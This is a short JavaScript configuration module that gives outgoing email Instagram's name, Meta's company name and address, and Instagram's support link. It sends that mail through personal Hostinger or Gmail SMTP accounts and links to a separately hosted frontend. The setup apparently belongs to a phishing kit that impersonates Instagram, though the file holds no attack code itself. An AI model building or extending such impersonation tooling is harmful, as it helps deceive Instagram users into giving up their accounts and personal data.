/**
 * Brand constants — all non-secret brand/SMTP config lives here.
 *
 * Email service and links flag are passed per-request from the frontend toggle —
 * no global state, no env variable needed.
 */

const BRAND = {
  NAME:        'Instagram',
  COMPANY:     'Meta Platforms, Inc.',
  ADDRESS:     '1601 Willow Road, Menlo Park, CA 94025',
  SUPPORT_URL: 'https://help.instagram.com/contact/',
  FROM_NAME:   'Instagram',

  // Credentials — resolved by service name passed at call time
  getEmail(service)    { return service === 'hostinger' ? process.env.HOSTINGER_EMAIL    : process.env.GOOGLE_EMAIL; },
  getPassword(service) { return service === 'hostinger' ? process.env.HOSTINGER_PASSWORD : process.env.GOOGLE_PASSWORD; },
  getReplyTo(service)  { return service === 'hostinger' ? process.env.HOSTINGER_EMAIL    : process.env.GOOGLE_EMAIL; },

  // SMTP settings — resolved by service name
  getSmtpHost(service)   { return service === 'hostinger' ? 'smtp.hostinger.com' : 'smtp.gmail.com'; },
  getSmtpPort(service)   { return service === 'hostinger' ? 465                  : 587; },
  getSmtpSecure(service) { return service === 'hostinger' ? true                 : false; },

  // Frontend URL — resolved at runtime based on NODE_ENV
  get FRONTEND_URL() {
    return process.env.NODE_ENV === 'production'
      ? process.env.PRODUCTION_FRONTEND_URL
      : process.env.LOCAL_FRONTEND_URL;
  },
};

module.exports = { BRAND };
